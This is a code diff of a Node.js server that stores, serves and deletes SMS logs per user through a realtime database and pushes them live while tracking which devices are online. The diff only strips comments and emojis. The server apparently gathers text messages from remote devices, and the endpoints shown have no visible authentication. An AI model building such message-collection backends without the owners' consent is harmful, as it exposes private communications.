@@ -716,9 +716,7 @@ smsLogsRef.on("child_changed", (snap) => {
   }
 });
 
-// Also listen for direct child changes (when a new SMS is added)
 smsLogsRef.on("child_changed", (snap) => {
-  // This will also trigger for individual SMS additions
 });
 
 setInterval(() => {
@@ -727,9 +725,7 @@ setInterval(() => {
   console.log('🔄 Cleared processed SMS IDs cache');
 }, 30 * 60 * 1000);
 
-/* ======================================================
-      SMS LOGS API ENDPOINTS
-====================================================== */
+
 app.get("/api/smslogs/:uid", async (req, res) => {
   try {
     const uid = clean(req.params.uid);
@@ -803,7 +799,6 @@ app.get("/api/smslogs/:uid/latest", async (req, res) => {
       })
       .filter(sms => sms.timestamp > tenMinutesAgo);
 
-    // Sort by timestamp (newest first)
     logsArray.sort((a, b) => b.timestamp - a.timestamp);
 
     return res.json({
@@ -813,7 +808,7 @@ app.get("/api/smslogs/:uid/latest", async (req, res) => {
       message: `${logsArray.length} recent SMS found`
     });
   } catch (err) {
-    console.error("❌ /api/smslogs/latest ERROR:", err.message);
+    console.error(" /api/smslogs/latest ERROR:", err.message);
     res.status(500).json({ success: false, error: err.message });
   }
 });
@@ -824,18 +819,14 @@ app.delete("/api/smslogs/:uid", async (req, res) => {
     const smsId = req.query.smsId;
 
     if (smsId) {
-      // Delete specific SMS
       await rtdb.ref(`smsLogs/${uid}/${smsId}`).remove();
-      // Remove from processed set
       processedSMSIds.delete(smsId);
       return res.json({
         success: true,
         message: `SMS ${smsId} deleted successfully`
       });
     } else {
-      // Delete all SMS for this user
       await rtdb.ref(`smsLogs/${uid}`).remove();
-      // Clear all processed IDs for this user
       for (const id of processedSMSIds) {
         if (id.startsWith(uid)) {
           processedSMSIds.delete(id);
@@ -852,9 +843,6 @@ app.delete("/api/smslogs/:uid", async (req, res) => {
   }
 });
 
-/* ======================================================
-      TEST SMS SOCKET ENDPOINT
-====================================================== */
 app.post("/api/test-sms/:uid", async (req, res) => {
   try {
     const uid = clean(req.params.uid);
@@ -868,9 +856,8 @@ app.post("/api/test-sms/:uid", async (req, res) => {
       numericTimestamp: Date.now()
     };
     
-    console.log(`🧪 TEST SMS for ${uid}:`, testSmsData);
+    console.log(` TEST SMS for ${uid}:`, testSmsData);
     
-    // Emit via socket
     io.emit("smsLogUpdate", {
       success: true,
       uid,
@@ -891,21 +878,16 @@ app.post("/api/test-sms/:uid", async (req, res) => {
   }
 });
 
-/* ======================================================
-      ⭐⭐ PERIODIC CHECK FOR ACTIVE DEVICES ⭐⭐
-====================================================== */
+
 setInterval(() => {
   console.log("🔄 Periodic check for active devices...");
   getAllBrosRepliesLive();
 }, 30000); // Every 30 seconds
 
-/* ======================================================
-      REAL-TIME CHECKONLINE MONITORING FOR ACTIVE BADGE
-====================================================== */
+
 rtdb.ref("checkOnline").on("value", async (snapshot) => {
-  console.log("🔥 Real-time checkOnline update detected");
+  console.log("  Real-time checkOnline update detected");
   
-  // Debounce to avoid too frequent updates
   setTimeout(async () => {
     const activeDevices = await getAllBrosRepliesLive();
     console.log(`📡 Real-time update: ${Object.keys(activeDevices).length} active devices`);
@@ -928,7 +910,7 @@ app.get("/", (_, res) => {
 
 server.listen(PORT, () => {
   console.log(` Server running on PORT ${PORT}`);
-  console.log(`📡 Socket.IO ready for connections`);
-  console.log(`📩 SMS Live Updates: ENABLED`);
-  console.log(`✅ getAllBrosRepliesLive: ACTIVE (every 30 seconds)`);
+  console.log(` Socket.IO ready for connections`);
+  console.log(` SMS Live Updates: ENABLED`);
+  console.log(` getAllBrosRepliesLive: ACTIVE (every 30 seconds)`);
 });
